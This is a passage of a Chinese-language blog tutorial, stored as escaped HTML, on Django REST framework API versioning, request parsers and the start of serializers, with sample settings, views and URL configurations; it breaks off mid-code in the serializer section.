&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;&lt;img id=&quot;code_img_closed_a07b68d4-d6e5-4772-870e-ddb65bace5f7&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_a07b68d4-d6e5-4772-870e-ddb65bace5f7&quot; class=&quot;code_img_opened&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_a07b68d4-d6e5-4772-870e-ddb65bace5f7&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;63&quot;&gt;
&lt;pre&gt;
REST_FRAMEWORK =&lt;span&gt; {
    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;VERSION_PARAM&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_VERSION&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ALLOWED_VERSIONS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v2&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;],
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 'DEFAULT_VERSIONING_CLASS':&quot;rest_framework.versioning.HostNameVersioning&quot;&lt;/span&gt;
    &lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_VERSIONING_CLASS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rest_framework.versioning.URLPathVersioning&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;settings.py配置&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36.5&quot;&gt;&lt;img id=&quot;code_img_closed_b53d329b-6357-4581-bbb9-f9a3147ed8b7&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_b53d329b-6357-4581-bbb9-f9a3147ed8b7&quot; class=&quot;code_img_opened&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_b53d329b-6357-4581-bbb9-f9a3147ed8b7&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;68&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; django.shortcuts &lt;span&gt;import&lt;/span&gt;&lt;span&gt; render
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.views &lt;span&gt;import&lt;/span&gt;&lt;span&gt; APIView
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.response &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Response
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.authentication &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BasicAuthentication
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.versioning &lt;span&gt;import&lt;/span&gt;&lt;span&gt; QueryParameterVersioning,URLPathVersioning,HostNameVersioning
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.renderers &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BrowsableAPIRenderer,JSONRenderer

&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 基于url传参&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; versioning_class = QueryParameterVersioning&lt;/span&gt;

    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 基于URL http://127.0.0.1:8001/api/v2/users/&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; versioning_class = URLPathVersioning&lt;/span&gt;

    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 基于子域名 http://v1.luffy.com/users/&lt;/span&gt;
    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; versioning_class = HostNameVersioning&lt;/span&gt;


    &lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
        self.dispatch
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request.version) # QueryParameterVersioning().detemiin_version()&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request.versioning_scheme) # QueryParameterVersioning()&lt;/span&gt;

        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 当前版本一样的URL&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; url = request.versioning_scheme.reverse(viewname='u',request=request)&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(url)&lt;/span&gt;

        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 当前版本不一样的URL&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; from django.urls import reverse&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; url = reverse(viewname='u',kwargs={'version':'v2'})&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(url)&lt;/span&gt;


        &lt;span&gt;return&lt;/span&gt; Response(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;...&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;views.py&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_073947b7-6a3c-45a0-bd14-c22f5ec1c5ad&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_073947b7-6a3c-45a0-bd14-c22f5ec1c5ad&quot; class=&quot;code_img_opened&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_073947b7-6a3c-45a0-bd14-c22f5ec1c5ad&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; django.conf.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url,include
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; . &lt;span&gt;import&lt;/span&gt;&lt;span&gt; views
urlpatterns &lt;/span&gt;=&lt;span&gt; [
    url(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^users/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, views.UsersView.as_view(),name=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;u&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;),
]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;url.py -----和view在一个APP中的路由&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;b、&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;49&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt; HostName
            urlpatterns &lt;/span&gt;=&lt;span&gt; [
                &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;url(r'^admin/', admin.site.urls),&lt;/span&gt;
                url(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^api/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, include(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;api.urls&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)),
            ]

            urlpatterns &lt;/span&gt;=&lt;span&gt; [
                url(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^users/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, views.UsersView.as_view(),name=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;u&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;),
            ]
            
            
            &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                
                &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
                    self.dispatch
                    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(request.version) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; QueryParameterVersioning().detemiin_version()&lt;/span&gt;
                    &lt;span&gt;print&lt;/span&gt;(request.versioning_scheme) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; QueryParameterVersioning()&lt;/span&gt;
&lt;span&gt;
            
            REST_FRAMEWORK &lt;/span&gt;=&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;VERSION_PARAM&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_VERSION&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ALLOWED_VERSIONS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v2&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;],
                &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_VERSIONING_CLASS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rest_framework.versioning.HostNameVersioning&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            }
            
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; C:\Windows\System32\drivers\etc&lt;/span&gt;
            &lt;span&gt;#&lt;/span&gt;&lt;span&gt; vim /etc/hosts&lt;/span&gt;
            127.0.0.1&lt;span&gt;    v1.luffy.com
            &lt;/span&gt;127.0.0.1    v2.luffy.com&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;四、rest framework解析器&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;请求的数据进行解析：请求体进行解析。表示服务端可以解析的数据格式的种类。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;Content-Type: application/url-&lt;span&gt;encoding.....
            request.body
            request.POST
            
            Content&lt;/span&gt;-Type: application/&lt;span&gt;json.....
            request.body
            request.POST
        
        客户端：
            Content&lt;/span&gt;-Type: application/&lt;span&gt;json
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;{&quot;name&quot;:&quot;alex&quot;,&quot;age&quot;:123}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
        
        服务端接收：
            读取客户端发送的Content&lt;/span&gt;-Type的值 application/&lt;span&gt;json
            
            parser_classes &lt;/span&gt;=&lt;span&gt; [JSONParser,]
            media_type_list &lt;/span&gt;= [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;application/json&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,]
        
            如果客户端的Content&lt;/span&gt;-Type的值和 application/&lt;span&gt;json 匹配：JSONParser处理数据
            如果客户端的Content&lt;/span&gt;-Type的值和 application/x-www-form-&lt;span&gt;urlencoded 匹配：FormParser处理数据
        
        
        配置：
            单视图：
            &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                parser_classes &lt;/span&gt;=&lt;span&gt; [JSONParser,]
                
            全局配置：
                REST_FRAMEWORK &lt;/span&gt;=&lt;span&gt; {
                    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;VERSION_PARAM&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_VERSION&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ALLOWED_VERSIONS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v2&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;],
                    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 'DEFAULT_VERSIONING_CLASS':&quot;rest_framework.versioning.HostNameVersioning&quot;&lt;/span&gt;
                    &lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_VERSIONING_CLASS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rest_framework.versioning.URLPathVersioning&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_PARSER_CLASSES&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:[
                        &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;rest_framework.parsers.JSONParser&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                        &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;rest_framework.parsers.FormParser&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
                    ]
                }&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36.5&quot;&gt;&lt;img id=&quot;code_img_closed_8d60eb81-82ec-43dc-96e9-53d37d79b8a7&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_8d60eb81-82ec-43dc-96e9-53d37d79b8a7&quot; class=&quot;code_img_opened&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_8d60eb81-82ec-43dc-96e9-53d37d79b8a7&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;68&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; django.conf.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url,include
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; django.contrib &lt;span&gt;import&lt;/span&gt;&lt;span&gt; admin

urlpatterns &lt;/span&gt;=&lt;span&gt; [
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;url(r'^admin/', admin.site.urls),&lt;/span&gt;
    url(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^api/(?P&amp;lt;version&amp;gt;[v1|v2]+)/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, include(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;api.urls&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)),
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; url(r'^api/', include('api.urls')),&lt;/span&gt;
    url(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^backend/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, include(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;backend.urls&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)),
]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;url.py&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;&lt;img id=&quot;code_img_closed_3942d720-bff7-46ed-8a36-b339c0a4ebc1&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_3942d720-bff7-46ed-8a36-b339c0a4ebc1&quot; class=&quot;code_img_opened&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_3942d720-bff7-46ed-8a36-b339c0a4ebc1&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;67&quot;&gt;
&lt;pre&gt;
REST_FRAMEWORK =&lt;span&gt; {
    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;VERSION_PARAM&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_VERSION&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;ALLOWED_VERSIONS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;v2&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;],
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 'DEFAULT_VERSIONING_CLASS':&quot;rest_framework.versioning.HostNameVersioning&quot;&lt;/span&gt;
    &lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_VERSIONING_CLASS&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;rest_framework.versioning.URLPathVersioning&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;DEFAULT_PARSER_CLASSES&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:[
        &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;rest_framework.parsers.JSONParser&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
        &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;rest_framework.parsers.FormParser&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
    ]
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;setting.py&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37.5&quot;&gt;&lt;img id=&quot;code_img_closed_5bda7102-7bce-49e5-8e45-fa1dcf6def79&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_5bda7102-7bce-49e5-8e45-fa1dcf6def79&quot; class=&quot;code_img_opened&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_5bda7102-7bce-49e5-8e45-fa1dcf6def79&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;70&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; django.shortcuts &lt;span&gt;import&lt;/span&gt;&lt;span&gt; render
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.views &lt;span&gt;import&lt;/span&gt;&lt;span&gt; APIView
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.response &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Response
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.authentication &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BasicAuthentication
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.versioning &lt;span&gt;import&lt;/span&gt;&lt;span&gt; QueryParameterVersioning,URLPathVersioning,HostNameVersioning
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.renderers &lt;span&gt;import&lt;/span&gt;&lt;span&gt; BrowsableAPIRenderer,JSONRenderer
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.parsers &lt;span&gt;import&lt;/span&gt;&lt;span&gt; JSONParser,FormParser
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; rest_framework.request &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Request
&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
        self.dispatch
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;...&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; post(self,request,*args,**&lt;span&gt;kwargs):
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; # application/json&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request._request.body) # b&quot;xxxxx&quot;   decode()   json.loads&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request._request.POST) # 无&lt;/span&gt;
        &lt;span&gt;#
&lt;/span&gt;        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; # www-form-url-encode&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request._request.body)&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request._request.POST)&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request.data)&lt;/span&gt;

        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request.POST)&lt;/span&gt;
        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; print(request.FILES)&lt;/span&gt;
&lt;span&gt;
        request.data
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;...&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;views.py&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33.5&quot;&gt;&lt;img id=&quot;code_img_closed_27c49923-4551-4022-be3a-51a8f8bb9164&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_27c49923-4551-4022-be3a-51a8f8bb9164&quot; class=&quot;code_img_opened&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_27c49923-4551-4022-be3a-51a8f8bb9164&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;62&quot;&gt;
&lt;pre&gt;
&lt;span&gt;from&lt;/span&gt; django.conf.urls &lt;span&gt;import&lt;/span&gt;&lt;span&gt; url,include
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; . &lt;span&gt;import&lt;/span&gt;&lt;span&gt; views
urlpatterns &lt;/span&gt;=&lt;span&gt; [
    url(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^users/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, views.UsersView.as_view(),name=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;u&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;),
]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;url.py 和view一个APP下的文件&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;五、 rest framework序列化+Form&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;序列化：&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;        对象 -&amp;gt; 字符串 序列化&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;        字符串 -&amp;gt; 对象 反序列化&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;目的：&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;        解决QuerySet序列化问题&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;序列化：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;a、基本操作&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;strong&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.Serializer):
                    name &lt;/span&gt;=&lt;span&gt; serializers.CharField()
                    pwd &lt;/span&gt;=&lt;span&gt; serializers.CharField()
            
                        
                &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersView(APIView):
                    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt; get(self,request,*args,**&lt;span&gt;kwargs):
                        self.dispatch
                        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式一：&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; user_list = models.UserInfo.objects.all().values('name','pwd','group__id',&quot;group__title&quot;)&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; return Response(user_list)&lt;/span&gt;

                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式二之多对象&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; user_list = models.UserInfo.objects.all()&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; ser = UsersSerializer(instance=user_list,many=True)&lt;/span&gt;
                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; return Response(ser.data)&lt;/span&gt;

                        &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 方式二之单对象&lt;/span&gt;
                        user =&lt;span&gt; models.UserInfo.objects.all().first()
                        ser &lt;/span&gt;= UsersSerializer(instance=user, many=&lt;span&gt;False)
                        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Response(ser.data)&lt;/strong&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;b、跨表&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; UsersSerializer(serializers.Serializer):
